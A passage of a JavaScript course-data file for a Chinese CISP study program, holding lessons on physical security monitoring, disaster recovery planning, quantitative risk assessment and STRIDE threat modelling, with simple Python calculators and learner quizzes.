Site)恢复通常需要？',options:['数分钟','数小时','数天','数周'],correctIndex:3,explanation:'冷站仅场地+基础设施,需采购设备、部署、恢复数据,通常数周。'},{id:'q60-5',question:'N+1冗余中"+1"指什么？',options:['1个额外备用组件','每天1次备份','1个异地数据中心','1天内必须恢复'],correctIndex:0,explanation:'在满足需求的基础数量N上,增加1个备用组件,单台故障不影响服务。'}],
  recommendedTools:weekToolMap[9]?.tools||[],labEnvironments:weekToolMap[9]?.labs||[],expertNotes:dayExpertNotes[60]||[],
});
allDays.push({id:'day-61',day:61,week:9,title:'监控系统（物理安全）',objectives:['CCTV','入侵检测','门禁日志'],content:`# 监控系统\n\n## 概述\n\n物理安全监控系统是安全运营的\"眼睛和耳朵\",由CCTV视频监控、入侵检测传感器、门禁日志三大子系统协同工作。现代监控系统已发展为AI驱动的智能分析平台,集成了人脸识别、车牌识别和异常行为实时告警能力。\n\n## 核心内容\n\n### 一、CCTV视频监控系统\n\n**系统组成:** 前端摄像机(固定枪机/PTZ球机/全景鱼眼) → NVR/DVR录像存储 → VMS视频管理平台统一管理。传输方式:PoE(网线同时供电和传数据)或光纤(远距离)。\n\n**关键参数标准:**\n- 分辨率: 最低1080P(1920×1080),关键区域推荐4K\n- 帧率: 最低15fps,30fps实现流畅回放(快速移动场景需更高帧率)\n- 存储保留时间: 法规要求30-90天,金融行业90天以上\n- 夜间能力: 红外补光距离50-100m,星光级低照度传感器\n\n**存储容量估算公式:**\n单路日存储(GB) = 码率(Mbps) × 3600 × 24 ÷ 8 ÷ 1024\n例如: 4Mbps码率×90天 = 约3.7TB/路\n\n**摄像头部署原则:**\n- 所有出入口全覆盖(正门、侧门、消防通道)\n- 机房/数据中心内部无死角\n- 访客接待区、停车场的车牌识别\n- 关键设备区推荐双摄冗余覆盖\n\n**AI智能分析五大能力:**\n1. 人脸识别与黑名单告警\n2. 车牌识别(ANPR)\n3. 区域入侵电子围栏\n4. 物品遗留/丢失检测\n5. 人流量统计和热力图分析\n\n### 二、入侵检测传感器\n\n**周界防护层:**\n- 红外对射探测器: 发射器和接收器配对,光束被遮挡即报警,探测距离可达200m\n- 微波探测器: 探测移动物体反射的微波信号变化\n- 振动光纤: 沿围栏铺设,探测切割和攀爬产生的振动\n- 电子围栏: 脉冲高压(非致命),兼具威慑和检测功能\n\n**建筑内部层:**\n- 被动红外探测器(PIR): 检测人体红外热辐射引起的温度变化。**注意:** 安装避开空调出风口和阳光直射(否则误报)\n- 双鉴探测器: 红外(热源) + 微波(移动)双重验证。两个传感器同时触发才算报警,大幅降低误报率。单一传感器触发不报警\n- 门磁传感器: 磁铁分离即触发,检测门窗开关\n- 玻璃破碎探测器: 检测玻璃破碎的特定频率声波(约4-6kHz)\n\n**报警联动机制:**\n传感器触发 → 报警主机接收 → 联动动作:\n1. 现场声光报警器启动\n2. 周边摄像头自动转向报警区域\n3. 门禁系统自动锁定相关区域\n4. VMS系统弹出实时画面\n5. 向安保人员手机APP推送告警\n\n### 三、门禁日志与审计规则\n\n**门禁日志六大记录要素:**\n1. 精确时间戳(精确到秒)\n2. 人员身份(工号/姓名)\n3. 门禁点位置\n4. 事件类型(正常开门/拒绝/超时未关/强行闯入)\n5. 认证方式(刷卡/指纹/人脸/PIN码)\n6. 进出方向(进/出)\n\n**门禁异常检测五大规则:**\n1. **暴力破解检测:** 同一读卡器短时间内≥3次拒绝 → 可能有人在测试卡或密码\n2. **反潜回(Anti-Passback):** 未刷卡出却刷卡进(或反之) → 可能一卡多人共用\n3. **非工作时间访问:** 深夜(22:00-06:00)或周末进入机房/财务室等敏感区域\n4. **超长停留:** 人员进入后超过正常工作时间未离开\n5. **行为异常:** 同一人员短时间内出现在物理上不可能同时到达的两个位置\n\n**审计最佳实践:**\n- 关键区域(机房/财务室/高管办公室)每周抽查门禁日志\n- 一般区域每月全量审查一次\n- 离职员工的门禁权限必须在离职当天即时收回\n- 门禁数据至少保留6个月用于事后追溯\n- 将门禁日志与CCTV录像进行交叉验证\n\n## 学习建议\n- PIR被动红外和双鉴探测器的误报原理重点理解\n- 存储容量估算公式在CISP考试中可能出现\n- 5条门禁异常规则中,暴力破解和非工作时间访问最重要`,
  codeExample:{language:'python',code:`# 门禁日志异常检测系统
from collections import defaultdict

# 模拟门禁事件日志 (时间, 人员, 区域, 事件)
logs = [
    ("08:00", "张三", "办公楼", "正常刷卡进入"),
    ("09:00", "李四", "机房",   "指纹验证通过"),
    ("20:30", "王五", "机房",   "正常刷卡进入"),
    ("22:00", "赵六", "机房",   "拒绝(无权限)"),
    ("22:01", "赵六", "机房",   "拒绝(无权限)"),
    ("22:03", "赵六", "机房",   "拒绝(无权限)"),
]

def detect_bruteforce(logs, threshold=3):
    """暴力破解检测：短时间内连续拒绝"""
    fails = defaultdict(int)
    for t, person, area, event in logs:
        if '拒绝' in event:
            fails[person] += 1
    for person, count in fails.items():
        if count >= threshold:
            print(f"[告警-暴力破解] {person} 连续被拒绝{count}次!")

def detect_off_hours(logs, start=18, end=7):
    """非工作时间访问敏感区域检测"""
    sensitive = ['机房', '财务室', '档案室']
    for t, person, area, event in logs:
        h = int(t.split(':')[0])
        if (h >= start or h < end) and area in sensitive:
            if '正常' in event or '通过' in event:
                print(f"[告警-非工作时间] {t} {person} 进入{area}")

print("=== 门禁日志审计分析 ===")
print("\\n[原始日志]")
for entry in logs:
    print(f"  {entry[0]} | {entry[1]:<4} | {entry[2]} | {entry[3]}")

print("\\n[异常检测结果]")
detect_bruteforce(logs)
detect_off_hours(logs)

# CCTV存储容量估算
print("\\n=== CCTV存储容量估算 ===")
bitrate_mbps = 4      # 码率 4Mbps
days = 90             # 保留 90天
cameras = 16          # 16路摄像头
gb_per_cam = bitrate_mbps * 3600 * 24 * days / 8 / 1024
total_tb = gb_per_cam * cameras / 1024
print(f"单路存储: {gb_per_cam:.0f}GB ({days}天)")
print(f"{cameras}路总存储: {total_tb:.1f}TB")`,description:'门禁日志异常检测和CCTV存储计算'},
  quiz:[{id:'q61-1',question:'CCTV的全称解释是什么？',options:['闭路电视 Closed-Circuit Television','中央控制电视 Central Control TV','计算机摄像电视 Computer Camera TV','认证摄像电视 Certified Camera TV'],correctIndex:0,explanation:'CCTV=Closed-Circuit Television,信号在闭合回路内传输不对外广播。'},{id:'q61-2',question:'被动红外探测器PIR的探测原理是？',options:['主动发射红外光检测反射','被动检测人体红外热辐射变化','发射微波并测量回波','通过摄像头图像分析'],correctIndex:1,explanation:'PIR本身不发射任何能量,被动接收人体红外热辐射,热源移动→温度变化→触发报警。'},{id:'q61-3',question:'双鉴探测器中"双鉴"指哪两种技术？',options:['红外+超声波','红外+微波','微波+激光','震动+红外'],correctIndex:1,explanation:'红外(热源)+微波(移动),两个传感器同时触发才算报警,单一触发不报警,大幅降低误报率。'},{id:'q61-4',question:'Anti-Passback(反潜回)解决什么问题？',options:['防止两人尾随进入','防止一卡多人共用——确保进出刷卡逻辑一致','防止黑客远程破解','防止门锁被物理破坏'],correctIndex:1,explanation:'反潜回要求人员必须按进-出逻辑刷卡(刷卡进→刷卡出→刷卡进),未刷卡出不能刷卡进。'},{id:'q61-5',question:'以下哪个不属于门禁异常检测规则？',options:['连续3次拒绝','深夜进入机房','用户正常早上打卡','未刷出却刷卡进'],correctIndex:2,explanation:'正常打卡是正常行为记录,不是异常。暴力破解、非工作时间、反潜回才是需要告警的异常。'}],
  recommendedTools:weekToolMap[9]?.tools||[],labEnvironments:weekToolMap[9]?.labs||[],expertNotes:dayExpertNotes[61]||[],
});
// ============================================================
// 完整教学内容扩展: Day 62-90
// ============================================================

// --- DAY 62: 容灾备份（物理安全）- 完整版 ---
allDays.push({id:'day-62',day:62,week:9,title:'容灾备份（物理安全）',
objectives:['理解BCP和DRP的核心区别与包含关系','掌握BIA业务影响分析和RPO/RTO/MTD','了解四类灾难恢复演练','理解冷温热站点的成本-时间权衡'],
content:`# 容灾备份

## 概述

容灾备份是组织面对灾难的最后防线。BCP（业务连续性计划）从业务视角保障关键流程不中断，DRP（灾难恢复计划）从技术视角恢复IT系统。两者密切相关但不等同——**BCP包含DRP**，前者范围更大。这部分是CISP考试的高频考点，需要清晰区分RPO和RTO。

## 核心内容

### 一、BCP与DRP的本质区别

**BCP（Business Continuity Plan）业务连续性计划：**
- 关注范围：整个业务（人、场地、供应商、IT系统、通信）
- 核心目标：灾难期间关键业务流程不中断或中断可接受
- 策略：IT恢复 + 人员安置 + 替代办公场所 + 供应链切换 + 客户沟通

**DRP（Disaster Recovery Plan）灾难恢复计划：**
- 关注范围：仅IT系统和数据的恢复
- 核心目标：在规定时间（RTO内）恢复IT服务
- 策略：备份恢复、异地切换、应急设备启用

**包含关系：BCP ⊇ DRP（BCP包含DRP）**
BCP关注"业务能不能做"，DRP专注"系统能不能用"。两者密不可分——IT不恢复，业务无法持续。

**BCP生命周期7步：**
项目启动→业务影响分析(BIA)→风险评估→制定恢复策略→编制计划文档→培训与演练→维护与改进

### 二、BIA业务影响分析（核心考点）

BIA回答两个问题，确定三个核心指标：

**RPO（Recovery Point Objective 恢复点目标）：**
- 问题：能容忍丢失多少数据？
- 含义：恢复后数据回溯到哪个时间点可接受
- 示例：RPO=1小时 → 最多丢1小时的数据
- 决策：备份间隔必须≤RPO。RPO=1小时要求每小时备份

**RTO（Recovery Time Objective 恢复时间目标）：**
- 问题：系统多久必须恢复运行？
- 含义：从宕机到恢复的允许最长时间
- 示例：RTO=4小时 → 4小时内必须恢复
- 决策：决定恢复站点类型。RTO<4小时通常需要热站

**MTD（Maximum Tolerable Downtime 最大可容忍停机时间）：**
- 超出MTD将造成不可接受损失（破产/监管处罚/客户流失）
- RTO必须≤MTD，通常RTO设为MTD的50%-70%留缓冲

**速记口诀：RPO=丢多少（Point时间点），RTO=等多久（Time时间），MTD=最大极限**

**实例：**银行核心交易系统 MTD=2小时 → RTO=1小时。每笔交易不能丢 → RPO=0（实时同步）。需要热站双活架构。

### 三、灾难恢复演练四层体系

演练是BCP有效性的唯一验证手段——不演练的计划等于零。

**1. 桌面推演（Tabletop Exercise）：**
会议室讨论各角色响应流程。验证流程逻辑和角色分配。成本最低。频率：每季度。

**2. 功能演练（Functional Exercise）：**
部分系统实际执行恢复（如只恢复数据库）。验证特定功能可恢复性。成本中等。频率：每半年。

**3. 模拟演练（Simulation Exercise）：**
全组织但不影响生产环境。接近实战但安全。频率：关键系统每年≥1次。

**4. 实战演练（Full-Scale Exercise）：**
真实灾难场景实际切换生产。完全验证BCP。风险最高。频率：每1-2年。

**AAR事后复盘（After Action Review）：**每次演练回答：什么做得好？哪里需改进？BCP文档有无漏洞？

### 四、恢复站点成本与时间权衡

**冷站（Cold Site）=裸壳：**仅场地+电力/网络，无IT设备。恢复数周（采购→部署→恢复数据）。成本最低，非关键系统。

**温站（Warm Site）=半装满：**场地+部分服务器/网络已就位，需从备份恢复数据。恢复数天。性价比最高。

**热站（Hot Site）=即时切换：**完整生产环境+实时数据同步。DNS/GSLB自动切换。恢复数分钟到数小时。成本0.8-1.5倍主站点。核心交易系统。

**核心规律：恢复时间与成本正相关，冷<温<热。**

## 学习建议
- BCP⊇DRP这个包含关系必考
- RPO和RTO定义上严格区分，做题时别搞混
- 演练四层按复杂度递进：桌面→功能→模拟→实战`,
codeExample:{language:'python',code:`# 容灾需求分析和演练计划工具
systems = {
    "核心交易系统": {"mtd_h":1,"rpo_min":0,"rto_h":0.5,"site":"hot"},
    "ERP系统":      {"mtd_h":8,"rpo_h":4,"rto_h":4,"site":"warm"},
    "档案管理系统": {"mtd_h":72,"rpo_h":24,"rto_h":24,"site":"cold"},
}
print("="*65)
print(f"{'系统':<16}{'MTD(h)':<10}{'RPO':<12}{'RTO(h)':<10}{'站点'}")
print("-"*65)
for name, r in systems.items():
    rpo = f"{r.get('rpo_min',r.get('rpo_h',0)*60)}分" if 'rpo_min' in r else f"{r.get('rpo_h')}小时"
    print(f"{name:<16}{r['mtd_h']:<10}{rpo:<12}{r['rto_h']:<10}{r['site']}")
print("\\n=== 年度BCP演练计划 ===")
for q,d,scope,purpose in [("Q1","桌面推演","全部门","流程验证"),("Q2","功能演练","IT部","数据库恢复"),("Q3","模拟演练","核心系统","非生产切换"),("Q4","实战演练","全组织","真实切换")]:
    print(f"  {q}: {d}({scope}) — {purpose}")`,description:'容灾需求分析和演练计划'},
quiz:[{id:'q62-1',question:'BCP与DRP的正确关系描述是？',options:['DRP是BCP的子集','BCP是DRP的子集','两者互不相关','两者完全相同'],correctIndex:0,explanation:'BCP(业务连续性)范围更广,涵盖人/场所/供应商/IT;DRP(灾难恢复)仅关注IT系统。'},{id:'q62-2',question:'RPO衡量什么指标？',options:['系统多久能恢复','能容忍丢失多少数据','每年停机时间','备份存储大小'],correctIndex:1,explanation:'RPO=Recovery Point Objective,定义可接受的数据丢失窗口。'},{id:'q62-3',question:'某系统MTD=2小时,RTO应该设为？',options:['正好2小时','大于2小时,如3小时','小于2小时,如1小时','MTD和RTO无关'],correctIndex:2,explanation:'RTO必须≤MTD,通常留50%余量。2小时MTD建议RTO=1小时。'},{id:'q62-4',question:'灾难恢复演练按难度从低到高？',options:['实战→模拟→功能→桌面','桌面→功能→模拟→实战','功能→桌面→模拟→实战','难度相同'],correctIndex:1,explanation:'桌面推演(讨论)最简单,实战(真实切换)最复杂。'},{id:'q62-5',question:'温站(Warm Site)相比冷站多了什么？',options:['实时同步数据','部分预装的IT设备','完全冗余环境','专属管理人员'],correctIndex:1,explanation:'温站=场地+部分IT设备已就位,数据需从备份恢复。冷站只有场地,热站才有实时数据。'}],
recommendedTools:weekToolMap[9]?.tools||[],labEnvironments:weekToolMap[9]?.labs||[],expertNotes:dayExpertNotes[62]||[],
});

// --- DAY 63: 第九周总结与测验 ---
allDays.push({id:'day-63',day:63,week:9,title:'第九周总结与测验（物理安全）',
objectives:['系统回顾物理安全四层防护模型','总结环境控制、监控和容灾核心知识','综合测验验证学习效果'],
content:`# 第九周总结与测验

## 本周学习回顾

物理安全是信息安全的基石层。本周系统学习了四层防护模型、门禁控制、环境安全、监控系统和容灾备份五大模块。

### 知识体系总览

**Day 57 - 物理安全概述：**四层防护模型(周边→建筑→机房→设备)、门禁认证四因素(知识/持有/生物/位置)、环境标准(18-27℃/40-60%)

**Day 58 - 物理访问控制：**DAC自主/MAC强制/RBAC基于角色三种模型、生物识别FAR/FRR/CER、最小权限和职责分离原则

**Day 59 - 环境安全：**温湿度标准(18-27℃/40-60%)、气体灭火FM200、RPO/RTO定义、3-2-1备份规则、N+1/2N冗余

**Day 60 - 数据中心安全：**Uptime Tier I-IV标准(99.671%~99.995%)、全量/增量/差异备份对比、冷温热站点选型

**Day 61 - 监控系统：**CCTV参数(1080P/15fps/30-90天)、PIR红外/双鉴探测器、门禁5大异常检测规则

**Day 62 - 容灾备份：**BCP⊇DRP包含关系、BIA业务影响分析(RPO/RTO/MTD)、四层演练体系、站点成本-时间权衡

### 高频考点速记

| 考点 | 关键数字/概念 |
|------|-------------|
| Tier IV | 99.995%, 年停机<26分钟 |
| 3-2-1规则 | 3份副本+2种介质+1份异地 |
| RPO vs RTO | RPO=丢多少, RTO=多久恢复 |
| BCP vs DRP | BCP范围>DRP, BCP包含DRP |
| 温湿度 | 18-27℃ / 40-60% |
| 双鉴探测器 | 红外+微波,同时触发 |
| 设备销毁 | 擦除→消磁→粉碎→焚烧 |
| 恢复站点 | 冷(数周)→温(数天)→热(数小时) |

## 综合测验`,
codeExample:{language:'python',code:`# 第九周：物理安全知识体系总复习
print("="*50)
print("物理安全核心知识体系")
print("="*50)
framework = {
    "四层防护":"周边→建筑→机房→设备",
    "门禁认证":"知识+持有+生物+位置",
    "环境标准":"18-27℃/40-60%,气体灭火",
    "备份规则":"3-2-1:3份+2种介质+1份异地",
    "Tier标准":"I(99.671%)→II→III→IV(99.995%)",
    "恢复站点":"冷(数周)→温(数天)→热(数小时)",
    "容灾体系":"BCP⊇DRP,RPO(丢多少),RTO(多久恢复)",
}
for k,v in framework.items(): print(f"  [{k}] {v}")
print("\\n核心公式")
print("  ALE=SLE×ARO, SLE=AV×EF, RTO≤MTD")`,description:'物理安全知识体系总结'},
quiz:[{id:'q63-1',question:'物理安全四层防护从外到内依次是？',options:['周边→建筑→机房→设备','设备→机房→建筑→周边','建筑→周边→机房→设备','机房→建筑→周边→设备'],correctIndex:0,explanation:'最外层周边(围墙大门),最内层设备(锁加密)。'},{id:'q63-2',question:'以下哪个不属于门禁认证的四因素？',options:['你知道的(PIN)','你拥有的(IC卡)','你是什么(指纹)','你喜欢的(个人偏好)'],correctIndex:3,explanation:'认证因素为知识、持有、生物、位置。个人偏好不是。'},{id:'q63-3',question:'关于3-2-1备份规则,正确的描述是？',options:['3种介质、2份数据、1个管理员','3份副本、2种介质、1份异地','3天保留、2次验证、1个中心','3个备份点、2个管理员、1套软件'],correctIndex:1,explanation:'3份数据(原始+2备份)、2种存储介质(磁盘+云)、1份异地存储。'},{id:'q63-4',question:'某数据库RPO=15分钟,RTO=2小时,这意味着？',options:['恢复后最多丢2小时数据','15分钟后系统恢复','最多丢15分钟数据,2小时内恢复','2小时后数据恢复但丢15分钟'],correctIndex:2,explanation:'RPO=15分钟决定最多丢15分钟数据,RTO=2小时决定系统2小时内恢复。'},{id:'q63-5',question:'双鉴探测器的主要优势是？',options:['探测距离更远','红外+微波双重验证,大幅降低误报','安装更简单','成本更低'],correctIndex:1,explanation:'两传感器同时触发才算报警,单一传感器误触发不报警,有效解决PIR误报问题。'}],
recommendedTools:weekToolMap[9]?.tools||[],labEnvironments:weekToolMap[9]?.labs||[],expertNotes:dayExpertNotes[63]||[],
});

// ============================================================
// WEEK 10: 安全工程 (Day 64-70) - 完整版
// ============================================================

allDays.push({id:'day-64',day:64,week:10,title:'安全评估概述（安全工程）',
objectives:['掌握风险评估五步流程','理解定量(ALE)和定性评估的差异','熟练应用STRIDE威胁建模六维度'],
content:`# 安全评估概述

## 概述

安全评估是信息安全工作的起点——不知道风险在哪里，就无法有效投入防御。安全评估系统回答三个核心问题：有什么需要保护（资产）？谁可能攻击（威胁）？哪里薄弱（脆弱性）？三者结合得到风险。CISP考试中风险评估是必考内容，重点考察定量和定性分析的差异。

## 核心内容

### 一、风险评估五步流程

**第一步：资产识别与赋值**
识别所有信息资产：硬件（服务器/网络设备）、软件（应用/数据库）、数据（客户信息/商业机密）、人员、文档。从保密性C、完整性I、可用性A三个维度估值。资产价值AV用货币量化。

**第二步：威胁识别**
威胁是可能对资产造成损害的潜在事件来源：
- 自然威胁：地震、洪水、火灾
- 人为无意：员工误操作、配置错误
- 人为故意：黑客攻击、内部恶意行为
- 环境威胁：停电、空调故障、网络中断
每种威胁用"可能性"(Likelihood)表示发生概率。

**第三步：脆弱性识别**
脆弱性是资产自身存在的可被利用的弱点。例如：未打补丁的服务器(脆弱性)→ RCE漏洞(威胁)利用。常见脆弱性：配置错误、未修复漏洞、弱密码、缺少访问控制。

**第四步：风险计算**
核心公式：**风险 = 资产价值 × 威胁可能性 × 脆弱性严重度（R=A×T×V）**

**第五步：风险处置**
- 风险规避：停止引发风险的活动（不做了）
- 风险减缓：实施安全控制降低风险（打补丁、加防火墙）
- 风险转移：转嫁给第三方（买网络安全保险、外包给云服务商）
- 风险接受：管理层正式接受残余风险（成本>收益时）

### 二、定性vs定量评估

**定性评估：**
使用描述性等级(高/中/低或1-5分)。快速直观，不需要精确数据。但主观性强，难以量化比较。工具：风险矩阵(可能性×影响)。

**定量评估：**
使用具体数值和货币。核心公式：**ALE = SLE × ARO**
- SLE(单次损失预期) = AV(资产价值) × EF(暴露因子，0-1)
- ARO(年发生率) = 每年发生次数
- ALE(年度预期损失) = 每年预计的金钱损失

**实例：**数据中心AV=1000万,火灾EF=80%,ARO=0.01(百年一遇)
SLE=1000万×0.8=800万,ALE=800万×0.01=8万/年
投入5万/年的防火系统合算(5万<8万)

**半定量：**定性等级附以数值区间(高=7-10,中=4-6,低=1-3)

### 三、STRIDE威胁建模

微软开发的威胁分类模型，从6个维度系统分析威胁：

| 字母 | 威胁 | 违背属性 | 防御 |
|------|------|---------|------|
| S | Spoofing伪装 | 认证性 | MFA强认证 |
| T | Tampering篡改 | 完整性 | 数字签名/哈希 |
| R | Repudiation否认 | 不可否认 | 审计日志/签名 |
| I | Info Disclosure信息泄露 | 机密性 | 加密/访问控制 |
| D | DoS拒绝服务 | 可用性 | 冗余/限流/CDN |
| E | Elevation提权 | 授权 | 最小权限/沙箱 |

**记忆：STRIDE六个字母顺序背下来，每个对应一个安全属性。**

## 学习建议
- ALE=SLE×ARO必须记忆
- STRIDE六字母对应六属性
- 实际工作先定性快评，再对高风险定量`,
codeExample:{language:'python',code:`# 定量风险评估计算工具
def calc_risk(name, av, ef, aro):
    sle = av * ef
    ale = sle * aro
    return {"资产":name,"AV":av,"EF":ef,"SLE":sle,"ARO":aro,"ALE":ale}

assets = [("核心数据库",10_000_000,0.9,0.05),("Web服务器",1_000_000,0.5,0.2),("邮件系统",500_000,0.3,0.3)]
print("="*70)
print(f"{'资产':<14}{'AV(万)':<10}{'SLE(万)':<12}{'ALE(万)':<12}")
print("-"*70)
for n,av,ef,aro in assets:
    r = calc_risk(n,av,ef,aro)
    print(f"{r['资产']:<14}{av/10000:<10.0f}{r['SLE']/10000:<12.0f}{r['ALE']/10000:<12.0f}")

# STRIDE检查清单
print("\\n=== STRIDE威胁建模清单 ===")
s={'S':'存在身份伪造风险?(弱密码)','T':'数据可被篡改?','R':'操作有不可否认记录?','I':'敏感数据加密?','D':'可承受大流量攻击?','E':'普通用户可提权?'}
for k,v in s.items(): print(f"  [{k}] {v}")`,description:'定量风险评估和STRIDE建模'},
quiz:[{id:'q64-1',question:'风险评估公式R=A×T×V中,V代表什么？',options:['价值Value','脆弱性Vulnerability','验证Verification','变化Variance'],correctIndex:1,explanation:'Vulnerability,资产中可被威胁利用的弱点。'},{id:'q64-2',question:'ALE(年度预期损失)的计算公式是？',options:['SLE÷ARO','SLE×ARO','SLE+ARO','AV×SLE'],correctIndex:1,explanation:'ALE=SLE×ARO。SLE=单次损失,ARO=年发生率。'},{id:'q64-3',question:'STRIDE中Tampering违背哪个安全属性？',options:['机密性','完整性','可用性','不可否认性'],correctIndex:1,explanation:'篡改破坏数据完整性。防御:哈希校验、数字签名。'},{id:'q64-4',question:'购买网络安全保险属于哪种风险处置方式？',options:['规避','减缓','转移','接受'],correctIndex:2,explanation:'保险将经济损失转嫁保险公司,典型风险转移。'},{id:'q64-5',question:'定性和定量评估的主要区别？',options:['定性用等级,定量用数值','定性更准确','定性不需数据','定量只能顾问做'],correctIndex:0,explanation:'定性(高/中/低)vs定量(货币金额和概率数值)。'}],
recommendedTools:weekToolMap[10]?.tools||[],labEnvironments:weekToolMap[10]?.labs||[],expertNotes:dayExpertNotes[64]||[],
});

allDays.push({id:'day-65',day:65,week:10,title:'风险评估方法（安全工程）',
objectives:['掌握定量风险评估ALE计算方法','理解定性风险矩阵','了解风险处置的四种策略'],
content:`# 风险评估方法

## 概述

风险评估有两种方法论：定量用钱说话，直观但需要大量数据；定性用等级说话，快速但主观。CISP考试常考ALE计算公式和相关参数的含义。实际工作中通常先用定性快速筛选高优先级风险，再对关键风险做定量分析。

## 核心内容

### 一、定量评估：ALE公式体系

**SLE（Single Loss Expectancy）= AV × EF**
- AV（Asset Value）：资产价值（元）
- EF（Exposure Factor）：暴露因子，一次安全事件导致的资产损失比例（0.0-1.0）
- 例：服务器价值100万，遭受攻击后损失80%，SLE=80万

**ARO（Annualized Rate of Occurrence）：年发生率**
- 预估每年该威胁发生的次数
- 例：0.1 = 每10年1次，1.0 = 每年1次，12 = 每月1次

**ALE（Annualized Loss Expectancy）= SLE × ARO**
- 年度预期损失，用于与安全投入做ROI比较
- 如果安全控制成本 < ALE，投资合算

**完整示例：**
数据中心 AV=5000万，火灾EF=0.8（烧毁80%资产），ARO=0.01（百年一遇）
SLE=5000万×0.8=4000万
ALE=4000万×0.01=40万/年
投资10万/年的防火系统 → ROI正向，合算

### 二、定性评估：风险矩阵

用二维矩阵表示风险等级：
纵轴=可能性(Likelihood)：低/中/高
横轴=影响(Impact)：低/中/高

风险等级=可能性×影响：
高×高=严重(红)，高×中/中×高=高(橙)，中×中=中(黄)，低×任意=低(绿)

优势：不依赖精确数据，沟通直观。劣势：不同评估者可能给出不同结果，可重复性差。

### 三、风险处置四策略

**规避(Avoid)：**停止或干脆不做产生风险的活动。最彻底但可能牺牲业务机会。

**减缓(Mitigate)：**实施安全控制降低风险概率或减小损失。最常见策略——打补丁、加WAF、实施访问控制。

**转移(Transfer)：**将风险转嫁第三方。典型方式：买网络安全保险、外包给云服务商（转移部分责任但声誉风险不可转移）、供应商合同中加入安全责任条款。

**接受(Accept)：**管理层正式认可并接受残余风险——当进一步控制的成本>预期损失时。必须有书面记录，不能默示接受。

**关键原则：风险永远不会降到零，总有残余风险需要接受。**

## 学习建议
- ALE=SLE×ARO公式不仅记，还要会算
- EF是0-1的百分比概念，不是货币金额
- 风险处置四策略中"接受"不等于忽略——是正式决策`,
codeExample:{language:'python',code:`# 风险评估计算器和ROI分析
def risk_assessment(name, av, ef, aro, control_cost=0):
    sle = av * ef
    ale = sle * aro
    saving = ale * 0.9  # 假设控制减少90%损失
    roi = saving - control_cost
    return f"{name}: SLE={sle/10000:.0f}万 ALE={ale/10000:.0f}万 投入{control_cost/10000:.0f}万 ROI={roi/10000:.0f}万 {'✓合算' if roi>0 else '✗不合算'}"

print("=== 风险评估与安全投入ROI分析 ===")
print(risk_assessment("数据中心火灾防护", 50_000_000, 0.8, 0.01, 100_000))
print(risk_assessment("DDoS攻击防护",    10_000_000, 0.3, 0.5, 200_000))
print(risk_assessment("内部数据泄露",     5_000_000, 0.6, 0.2, 300_000))
print("\\n风险处置策略速查:")
strategies = {"规避":"停止活动","减缓":"实施控制","转移":"购买保险","接受":"残余风险"}
for k,v in strategies.items(): print(f"  {k}: {v}")`,description:'风险评估ROI分析'},
quiz:[{id:'q65-1',question:'AV在风险评估中代表什么？',options:['Asset Value资产价值','Attack Vector攻击向量','Annual Verdict年度判断','Access Validator访问验证'],correctIndex:0,explanation:'Asset Value,资产价值,通常用货币金额表示。'},{id:'q65-2',question:'以下哪个是风险转移的典型例子？',options:['停止有风险的业务','安装防火墙','购买网络安全保险','接受剩余风险'],correctIndex:2,explanation:'保险将经济损失转嫁第三方,是风险转移。其他分别对应规避/减缓/接受。'},{id:'q65-3',question:'EF(暴露因子)的取值范围是？',options:['0到任意正数','0.0到1.0','-1.0到1.0','1到100'],correctIndex:1,explanation:'EF是百分比(损失比例),取值0(无损)到1.0(完全损失)。'},{id:'q65-4',question:'定性风险矩阵的两个维度是？',options:['时间和成本','可能性和影响','攻击者和防御者','复杂度和速度'],correctIndex:1,explanation:'可能性(Likelihood)×影响(Impact)→风险等级。'},{id:'q65-5',question:'风险接受(Accept)的正确理解是？',options:['不管它听天由命','管理层正式决策接受残余风险,前提是控制成本>预期损失','永远是错的','等同于忽略风险'],correctIndex:1,explanation:'风险接受是经过评估后的正式决策,有书面记录,不是默认或忽略。'}],
recommendedTools:weekToolMap[10]?.tools||[],labEnvironments:weekToolMap[10]?.labs||[],expertNotes:dayExpertNotes[65]||[],
});

allDays.push({id:'day-66',day:66,week:10,title:'威胁建模（安全工程）',
objectives:['掌握STRIDE六维威胁分类','了解DFD数据流图','学习攻击树建模方法'],
content:`# 威胁建模

## 概述

威胁建模是在设计阶段识别系统安全威胁的系统性方法。STRIDE是微软提出的经典分类模型，DFD数据流图是分析数据流动和信任边界的工具，攻击树从攻击者视角逐层分解攻击目标。CISP考试中STRIDE六个字母代表的威胁类型是高频考点。

## 核心内容

### 一、STRIDE威胁模型详解

STRIDE每个字母对应一种威胁类型和一个违背的安全属性：

**S - Spoofing（伪装/欺骗身份）**
- 含义：攻击者伪装成合法用户或系统
- 违背：认证性(Authentication)
- 案例：密码猜测、会话劫持、中间人伪造证书
- 防御：强密码策略、MFA多因素认证、证书验证

**T - Tampering（篡改数据）**
- 含义：攻击者未经授权修改数据
- 违背：完整性(Integrity)
- 案例：SQL注入修改数据库、中间人篡改通信内容、修改配置文件
- 防御：哈希校验、数字签名、访问控制、WAF

**R - Repudiation（否认/抵赖）**
- 含义：用户否认曾执行某个操作,系统无法证明
- 违背：不可否认性(Non-repudiation)
- 案例："我没转这笔账"、"不是我删除的"
- 防御：完整审计日志、数字签名、时间戳、双人授权

**I - Information Disclosure（信息泄露）**
- 含义：敏感数据被未授权方获取
- 违背：机密性(Confidentiality)
- 案例：数据库泄露、日志暴露敏感信息、错误信息泄露
- 防御：加密存储和传输、最小权限访问、数据脱敏

**D - Denial of Service（拒绝服务）**
- 含义：攻击导致服务不可用
- 违背：可用性(Availability)
- 案例：SYN Flood、HTTP Flood、应用层CC攻击
- 防御：冗余架构、限流、CDN、抗DDoS设备

**E - Elevation of Privilege（权限提升）**
- 含义：普通用户获取管理员权限
- 违背：授权(Authorization)
- 案例：缓冲区溢出提权、SUID滥用、Token窃取
- 防御：最小权限原则、沙箱、及时打补丁

### 二、DFD数据流图

分析系统中的数据如何在各组件间流动：

**DFD五要素：**
- 外部实体(External Entity)：用户、第三方系统
- 处理过程(Process)：应用服务器、数据库引擎
- 数据存储(Data Store)：数据库、文件系统
- 数据流(Data Flow)：箭头,表示数据流向
- 信任边界(Trust Boundary)：标识安全域的分界线

**信任边界的重要性：**穿越信任边界的数据流是最需要安全控制的点——认证、加密、输入验证都应部署在信任边界上。

### 三、攻击树(Attack Tree)

攻击树从攻击者视角逐层分解：
- 根节点：攻击者的最终目标（如"窃取客户数据"）
- 分支节点：实现目标的子方法（"SQL注入"或"社工获取凭证"）
